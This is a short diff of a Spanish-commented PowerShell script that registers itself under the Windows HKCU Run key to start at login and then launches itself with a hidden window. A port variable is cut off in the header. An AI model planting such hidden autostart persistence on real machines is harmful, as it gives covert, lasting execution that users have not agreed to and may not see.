@@ -2,7 +2,7 @@ $rutaScript = Join-Path $env:HOMEDRIVE "\Users\$env:USERNAME\script.ps1";$port =
 
 $nombreEntrada = "MiScript"
 $valorEntrada = "powershell.exe -File $rutaScript"
-if (-not (Test-Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\$nombreEntrada")) {
+if ((Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $nombreEntrada -ErrorAction SilentlyContinue) -eq $null) {
     New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $nombreEntrada -Value $valorEntrada
 }
 Start-Process -FilePath "powershell.exe" -ArgumentList "-WindowStyle Hidden -File $rutaScript" -NoNewWindow -PassThru
